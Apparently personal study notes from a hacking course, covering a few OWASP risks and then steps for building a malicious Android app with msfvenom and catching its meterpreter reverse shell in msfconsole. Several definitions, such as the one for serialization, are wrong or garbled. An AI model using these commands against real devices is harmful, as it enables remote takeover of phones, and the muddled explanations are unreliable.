Insecure deserialization
data sent to the web sever is converted into objects and sent sequentially called serialized objects
it is deserialized at the server end

Serializtion is the process used to only show cookie in the url and not the paramters 

password are stored in hash format in the data basesd

attacker captures the packet containing the user priviliges adn changes them to get the admin access 

attacker escalates from normal user access to admin access
atttacker can also perform DOS and DDOS attacks

Using components and known vulns:
the frameworks or libraries or features usde by developer even though that particular component has a  vuln , that leads to an attack by the attacker


Insufficient logging or monitoring:
not properly logging all the neccessary information in the logs can gives the hacker an additional benefit in the process of maintaining access and clearing tracks

***** HACKING MOBILE PLATFORMS *******
android

this attck works only in the local network

kali linux:
tools
MSFVENOM : metasploit framework venom
venom creates malicious apps

commad : msfvenom -p android/merterpreter/reverse_tcp LHOST=<kali linux ipaddr> LPORT=4444 R > <appname>

for msf console :
command: msfconsole

we have to create a folder to handle the tcp requests
command : use exploit/multi/handler

then we have to set the payload :
command : set payload android/meterpreter/reverse_tcp

then we have to set the kali linux ipaddr as LHOST
command : set LHOST 10.0.2.15
